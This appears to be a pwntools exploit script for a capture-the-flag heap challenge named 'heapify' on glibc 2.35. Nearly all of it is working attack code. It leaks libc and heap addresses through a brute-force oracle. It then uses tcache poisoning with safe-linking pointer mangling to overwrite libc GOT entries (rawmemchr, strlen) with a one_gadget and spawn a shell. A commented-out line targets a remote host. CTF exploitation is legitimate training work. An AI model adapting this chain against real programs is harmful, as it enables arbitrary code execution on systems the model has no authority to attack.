#!/usr/bin/python3

from pwn import *

exe = ELF("./heapify", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
ld = ELF("./ld-2.35.so", checksec=False)

context.binary = exe

context.terminal = ['tmux', 'splitw', '-h', '-p', '70', '-I']
# context.log_level 	= "DEBUG"
context.log_level 	= "INFO"
isDebug = False

gs = '''
directory /opt/GLIBC_SOURCE_CODE
brva 0x000000000000148E
brva 0x00000000000014C8
brva 0x0000000000001537
brva 0x0000000000001570
brva 0x00000000000013FF
brva 0x00000000000018FB
brva 0x0000000000001288
brva 0x0000000000001309
disable
continue
'''.format(**locals())

def start_local(isDebug, argv=[], *a, **kw):
	if args.GDB or isDebug:
		return gdb.debug([exe.path], gdbscript=gs)
	else:
		return process([exe.path], *a, **kw)
		
def send_command(io, size: int = 24, priority: bytes = b"1", userdata: bytes = b"flag"):
	io.sendlineafter(b"> ", b"1")
	io.sendlineafter(b"command: ", f"{size}".encode())
	io.sendlineafter(b"priority: ", priority)
	io.sendlineafter(b"command: ", userdata)

def execute_command(io):
	io.sendlineafter(b"> ", b"2")
	result = io.recvuntil(b"2. Execute a command")
	return result

def deobfuscate(x: int, l: int = 64) -> int:
    p = 0

    for i in range(l * 4, 0, -4):
        v1 = (x & (0xf << i)) >> i
        v2 = (p & (0xf << i + 12 )) >> i + 12  
        p |= (v1 ^ v2) << i

    return p

def obfuscate(ptr: int, addr: int) -> int:
	return ptr ^ (addr >> 12)

def create_small_bin_leak():
	priority = 5
	size = 48

	# malloc 8 chunks 
	for _ in range(8):
		send_command(io, size=size, priority=str(priority).encode(), userdata=b"w" * 4)

	# free to tcache (all 7 slots) and the fastbin.
	for i in range(8):
		execute_command(io)

	# the magic.... use scanf inner malloc call to allocatge and then free to unsortedbin and then smallbin
	weirdValue = "0" * 1023
	weirdValue += "1" # <-- this will become a priority value for the resulting command chunk
	send_command(io, size=10, priority=weirdValue.encode(), userdata=b"j" * 4)


	for _ in range(7):
		send_command(io, size=size, priority=str(priority).encode(), userdata=b"w" * 4)

	send_command(io, size=size, priority=str("-").encode(), userdata=b"")

	for i in range(8):
		execute_command(io)

	

digit_position = 9 # <-- a global digit position when testing the oracle

def libc_leak_action(base_value):
	execute_command(io)
	create_small_bin_leak()

def libc_leak_action2(p, base_value)->int:
	global digit_position
	if digit_position == 1:
		p.success(f'Found value: {base_value:#018x}')
		return base_value

def heap_leak_action(base_value):
	execute_command(io)
	send_command(io, size=58, priority=str(5).encode(), userdata=b"qqqq") # <-- Create a chunk with new size and free it to tcache
	send_command(io, size=58, priority=str(5).encode(), userdata=b"qqqq") # <-- Create a chunk with new size and free it to tcache
	execute_command(io)
	execute_command(io)
	send_command(io, size=58, priority=str("-").encode(), userdata=b"qqqq") # <-- Grab a chunk from tcache but dont overwrite the priority value so we will have an fd pointer to leak

def heap_leak_action2(p, base_value)->int:
	global digit_position
	if digit_position == 0:
		p.success(f'Found value: {base_value:#018x}')
		return base_value

def oracle_libc(io, base_value):
	create_small_bin_leak()
	return oracle_leak(io, base_value, libc_leak_action, libc_leak_action2)

def orcale_heap(io, base_value):
	global digit_position
	digit_position = 10
	execute_command(io) # <-- removes the libc smallbin artifcat. Now all chunks are in free lists
	send_command(io, size=58, priority=str(5).encode(), userdata=b"qqqq") # <-- Create a chunk with new size and free it to tcache
	send_command(io, size=58, priority=str(5).encode(), userdata=b"qqqq") # <-- Create a chunk with new size and free it to tcache
	execute_command(io)
	execute_command(io)
	send_command(io, size=58, priority=str("-").encode(), userdata=b"qqqq") # <-- Grab a chunk from tcache but dont overwrite the priority value so we will have an fd pointer to leak
	return oracle_leak(io=io, base_value=base_value, custom_action1=heap_leak_action, custom_action2=heap_leak_action2, size=58)

def oracle_leak(io, base_value, custom_action1=None, custom_action2=None, size=48):
	global digit_position
	try:
		def increment_value(value):
			global digit_position
			hex_value = list(f'{value:016x}')
			adjusted_position = 15 - digit_position
			current_digit_value = int(hex_value[adjusted_position], 16)
			current_digit_value += 1
			if current_digit_value > 0xf:
				current_digit_value = 0xf
				if digit_position > 0:
					digit_position = digit_position - 1
					return None
			
			hex_value[adjusted_position] = f'{current_digit_value:x}'
			new_value = int(''.join(hex_value), 16)
			return new_value

		# Function to decrement a specific digit in the hexadecimal number
		def decrement_value(value):
			global digit_position
			hex_value = list(f'{value:016x}')
			adjusted_position = 15 - digit_position
			current_digit_value = int(hex_value[adjusted_position], 16)
			current_digit_value -= 1
			if current_digit_value < 0:
				current_digit_value = 0
				
			hex_value[adjusted_position] = f'{current_digit_value:x}'
			new_value = int(''.join(hex_value), 16)
			return new_value


		p = log.progress("Brute forcing")

		while True:
			p.status(f"{hex(base_value)}")
			
			send_command(io, size=size, priority=str(base_value).encode(), userdata=b"flag")
			response = execute_command(io).decode()

			if "Congratulations, here's the flag" in response:
				temp_base_value = increment_value(base_value)
				if temp_base_value == None:
					continue
				else:
					base_value = temp_base_value
			else:
				if custom_action2 != None:
					result = custom_action2(p, base_value)
					if result != None:
						return result

				# we found that the current value we passed is larger than the target, so lets decrement back
				# its value by one and then increment the next digit in line.
				base_value = decrement_value(base_value) 
				if custom_action1 != None:
					custom_action1(base_value)
				
				digit_position -= 1
				if digit_position < 0:
					p.success(f'Found value: {base_value:#018x}')
					return base_value
				base_value = increment_value(base_value)

	except Exception as e:
		io.wait()
		exit_code = io.poll()
		if exit_code < 0:
			print(f"Process terminated with signal {exit_code}")
		else:
			print(f"Process exited with exit code {exit_code}")

class PayLoadDataStructure:
	def __init__(self, site_address: int, priority_val: bytes, user_data_val: bytes):
		self._priority_val = priority_val
		self._user_data_val = user_data_val
		self._site_address = site_address

	def get_priority_val(self) -> bytes:
		return self._priority_val

	def get_user_data_val(self) -> bytes:
		return self._user_data_val

	def get_site_address(self) -> int:
		return self._site_address

def overwrite_2():
	# Will release 0x70 and a 0x40 chunk below it
	for _ in range(6):
		execute_command(io)

	# input("Before poison2 (WHERE) strlen_xcvs2_got_payload")
	printf_fp = libc.address + 0x5bf67
	one_gadget = libc.address + 0xebcf8
	new_memcpy_gadget = libc.address + 0x000000000002B6A0
	what = libc.address + 0x000000000002CD53

	strlen_xcvs2_got_payload = PayLoadDataStructure(libc.address + 0x219090, str(int(0x0)).encode(), p64(what)) # <-- ready
	mempcpy_avx_unaligned_erms_got_payload = PayLoadDataStructure(libc.address + 0x219040, str(int(one_gadget)).encode(), p64(one_gadget)[:-1])
	strcmp_avx2_got_payload = PayLoadDataStructure(libc.address + 0x219190, b"-", p64(printf_fp))

	# Allocate the 0x70 chunk. It will overwrite fd of a tcache entry which we will allocate back to overwrite the address with a value
	fake_chunk_target = p64(obfuscate(strlen_xcvs2_got_payload.get_site_address(), heap_base+0x1000))
	send_command(io, size=96, priority=b"0", userdata=p64(0) * 2 + p64(0x41) + p64(0) * 7 + p64(0x41) + fake_chunk_target[:-1])

	# Allocate tcache entries
	for _ in range(2):
		send_command(io, size=48, priority=b"-", userdata=b"" * 4)	
	
	# We alloc the target fake chunk back from 0x40 tcache and we can set values to that address.
	# input("Before poison trigger2 (WHAT) what")
	send_command(io, size=48, priority=strlen_xcvs2_got_payload.get_priority_val(), userdata=strlen_xcvs2_got_payload.get_user_data_val())

def overwrite_1(io):
	priority_val = 0
	target_address = heap_base + 0x1190

	# Clear all the bins.
	# We calculate that the target_address that will be sent to free() should be placed in the 3rd allocation. It will later get freed, resulting
	# in a fake chunk in tcache
	for i in range(8):
		if i == 3:
			send_command(io, size=48, priority=str(int(target_address)).encode(), userdata=p64(0)*5)
		else:
			send_command(io, size=48, priority=str(int(target_address+i)).encode(), userdata=p64(0)*4+p64(0)[:-1])


	# Keep clearing 0x40 bins.
	for i in range(2):
		send_command(io, size=48, priority=str(int(priority_val)).encode(), userdata=p64(0) * 2)

	# Keep clearing 0x20 bins.
	priority_val -= 1
	send_command(io, size=8, priority=str(int(priority_val)).encode(), userdata=p64(0)[:-2])

	# Keep clearing 0x50 bins
	for i in range(2):
		priority_val -= 1
		send_command(io, size=58, priority=str(int(priority_val)).encode(), userdata=p64(0) * 2)

	# Trigger the write...
	# input("Fake chunk creation... (allocating commands)")
	priority_val -= 1
	amount = 50
	for i in range(amount):
		priority_val += 1
		if i == 0x26:
			send_command(io, size=48, priority=str(int(priority_val)).encode(), userdata=p64(0) * 2 + p64(0x71) + p64(0))
		else:
			send_command(io, size=48, priority=str(int(priority_val)).encode(), userdata=b"v" * 4)

	# input("Fake chunk creation... (executing commands)")
	for i in range(39):
		execute_command(io)

	# Clean up 0x40 tcache
	for q in range(7):
		send_command(io, size=48, priority=b"-", userdata=b"")

	# Add 2 0x40 chunks back to tcache. They will be placed AFTER the 0x70 fake chunk.
	execute_command(io)
	execute_command(io)

	# This will allocate back the 0x70 fake chunk and will overwrite fd in the last 0x40 tcache chunk. 
	# It will point to the target we want to overlap. Once we allocate that chunk, we will have access to 
	# that target address and we can set data there. Targeting the GOT of libc
	# input("Before poison1 (WHERE) __j_rawmemchr")
	one_gadget = libc.address + 0xebcf8
	# printf_fp = libc.address + 0x5bf67

	# different payloads (choose one)
	# change_heap_structure_size_payload = PayLoadDataStructure(heap_base + 0x2a0, str(int(0x0)).encode(), p64(heap_base + 0x1190) + p64(heap_base + 0x12b0) + p64(heap_base + 0x1230) + p64(heap_base + 0x1330) + p64(heap_base + 0x570) + p64(heap_base + 0x12f0)[:-1])
	# mempcpy_avx_unaligned_erms_got_payload = PayLoadDataStructure(libc.address + 0x219040, str(int(one_gadget)).encode(), b"")
	# strcmp_avx2_got_payload = PayLoadDataStructure(libc.address + 0x219190, str(int(one_gadget)).encode(), p64(one_gadget)[:-1])
	# strcspn_got_payload = PayLoadDataStructure(libc.address + 0x219100, b"-", p64(one_gadget))
	# __libc_calloc = PayLoadDataStructure(libc.address + 0x00219050, str(int(one_gadget)).encode(), b"")
	# __new_memcpy_ifunc = PayLoadDataStructure(libc.address + 0x219160, str(int(one_gadget)).encode(), b"")
	__j_rawmemchr = PayLoadDataStructure(libc.address + 0x219020, str(int(one_gadget)).encode(), b"")

	# overwrite fd of the poisoned tcache entry
	fake_chunk_target = p64(obfuscate(__j_rawmemchr.get_site_address(), heap_base+0x1000))
	send_command(io, size=96, priority=b"0", userdata=p64(0) * 2 + p64(0x41) + p64(0) * 7 + p64(0x41) + fake_chunk_target[:-1])

	# Get rid of the first 0x40 chunk in tcachebin
	send_command(io, size=48, priority=b"41", userdata=b"w" * 4)

	# input("Before poison trigger1 (WHAT) one_gadget")
	# Finally we alloc the target fake chunk back from 0x40 tcache and we can set values to that address.
	send_command(io, size=48, priority=__j_rawmemchr.get_priority_val(), userdata=__j_rawmemchr.get_user_data_val())

	### overwrite strlen
	overwrite_2()

#===========================================================
#                    EXPLOIT GOES HERE					   #
#===========================================================

######## LOCAL ########
#ip_offset = find_ip_offset(cyclic(200))
#ip_offset = 56str(int(bin_sh)).encode()
io = start_local(isDebug)
io.timeout = 0.02

######## REMOTE ########
# io = remote("94.237.50.175", 32123)

#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
# Leak stuff...
# input("Start leaking...")
leak = oracle_libc(io, 0x00007f0000000000)
libc.address = leak - 0x219d10
log.info(f'libc base: {hex(libc.address)}')

leak = orcale_heap(io, 0x0000500000000000)
heap_base = deobfuscate(leak) - 0x6d0
log.info(f"heap leak: {hex(heap_base)}")

execute_command(io) # <-- get rid of the last unused command to get a clean slate.


#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
# Exploit for shell
overwrite_1(io)	

io.interactive()
